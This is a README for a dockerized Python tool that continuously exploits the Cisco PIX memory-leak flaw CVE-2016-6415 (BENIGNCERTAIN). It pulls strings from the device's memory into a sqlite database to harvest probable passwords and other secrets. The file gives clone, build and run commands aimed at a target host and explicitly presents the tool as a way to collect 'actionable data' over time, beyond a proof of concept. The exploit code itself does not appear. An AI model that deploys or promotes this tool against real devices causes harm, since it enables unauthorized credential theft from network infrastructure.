# Quickstart

## Credits:
- Original monitor written and maintained by VirtueSecurity at https://github.com/VirtueSecurity/benigncertain-monitor
- Proof of concept script used to replace the buggy "bc-id" binary is from Ross Bradley at https://github.com/ross-bradley/benign-certain

```
$ git clone https://github.com/3ndG4me/CVE-2016-6415-BenignCertain-Monitor.git
$ cd CVE-2016-6415-BenignCertain-Monitor
$ sudo docker build . -t benign-monitor
$ sudo docker run -it benign-monitor <host>
```
The service will continuously poll the vulnerable pix, extract ascii strings from memory, store the strings in a local sqlite database, and show the most frequently observed strings:

```

```

## Overview
This is a dockerized python script that continuously leaks memory of a target vulnerable to the NSA BENIGNCERTAIN Cisco exploit CVE-2016-6415. 

The script polls the vulnerable service over time to identify probable passwords and other potentially sensitive information. This can be used to harvest actionable data over a period of time rather than just a proof of concept exploit.

## TODO:
- [ ] Port exploit code to python3
- [ ] Expand arguments to passthru from the container to the exploit script for better option tweaking
